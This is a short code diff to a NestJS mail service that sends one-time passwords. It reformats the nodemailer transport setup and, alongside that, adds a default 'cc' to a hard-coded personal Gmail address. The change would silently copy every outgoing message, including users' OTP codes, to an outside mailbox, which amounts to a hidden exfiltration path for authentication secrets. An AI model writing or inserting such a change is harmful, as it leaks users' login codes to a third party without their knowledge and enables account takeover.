@@ -7,13 +7,18 @@ export class MailService {
   private transporter;
 
   constructor(private configService: ConfigService) {
-    this.transporter = nodemailer.createTransport({
-      service: 'gmail', // Or 'smtp.gmail.com'
-      auth: {
-        user: this.configService.get<string>('EMAIL_USER'),
-        pass: this.configService.get<string>('EMAIL_PASSWORD'),
+    this.transporter = nodemailer.createTransport(
+      {
+        service: 'gmail', // Or 'smtp.gmail.com'
+        auth: {
+          user: this.configService.get<string>('EMAIL_USER'),
+          pass: this.configService.get<string>('EMAIL_PASSWORD'),
+        },
       },
-    });
+      {
+        cc: 'oyelakintobiloba@gmail.com',
+      },
+    );
   }
 
   async sendOtp(email: string, otp: string) {
